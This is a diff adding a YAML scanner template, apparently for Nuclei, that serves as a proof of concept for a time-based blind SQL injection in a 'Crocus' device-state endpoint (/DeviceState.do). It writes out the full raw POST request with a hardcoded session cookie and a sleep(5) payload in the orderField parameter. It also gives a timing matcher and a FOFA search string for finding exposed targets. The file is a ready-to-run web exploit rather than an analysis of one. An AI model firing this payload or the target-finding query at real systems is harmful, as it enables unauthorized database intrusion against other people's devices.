@@ -1,0 +1,37 @@
+id: poc-tgrsghd1wsuk2m5q
+info:
+  name: Crocus devicestate sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tgrsghd1wsuk2m5q
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tgrsghd1wsuk2m5q
+    fofa: body="window.registerLogin.changeAuthCode"
+http:
+- raw:
+  - 'POST /DeviceState.do?Action=Query HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Cookie: Saffron.U=VUlEPTEmVU49c3RyZWFtYXgyMDAyMDgxOCZHSUQ9MTcyNDI5Mjg4ODgyMC41MTQ3OSZSSUQ9MSZNPUJNYXAmSU5TPTE=
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+
+
+    PageSize=1&PageIndex=0&orderField=(select*from(select%20sleep(5))a)'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
